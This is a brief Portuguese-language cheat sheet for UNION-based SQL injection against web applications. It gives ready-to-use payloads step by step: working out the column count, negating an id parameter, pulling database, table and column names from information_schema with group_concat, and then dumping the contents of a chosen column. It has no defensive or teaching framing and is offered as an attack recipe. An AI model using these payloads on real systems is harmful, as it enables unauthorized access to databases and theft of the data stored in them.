UNION SELECT (COLUNAS):
	USE O UNION SELECT COM TODAS AS COLUNAS ENCONTRADAS.
	
	EX: union select 1,2,3
	
GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA:
	
	MOSTRA TODAS AS DATABASES, USE UM '-' ANTES DO NÚMERO DO ID.
		
		EX: id=-1 union select 1,2, group_concat(schema_name) from information_schema.schemata
	
GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA="NOME_DO_DATABASE":
	
	MOSTRA AS TABELAS DO BANCO DE DADOS SELECIONADO.

GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA="NOME_DO_DATABASE" AND TABLE_NAME="NOME_DA_TABELA":

	MOSTRA AS COLUNAS DENTRO DA TABELA SELECIONADA.

COLUNA_SELECIONADA FROM NOME_DATABASE.NOME_TABELA:
	
	PARA DESCOBRIR O CONTEÚDO DENTRO DAS COLUNAS.
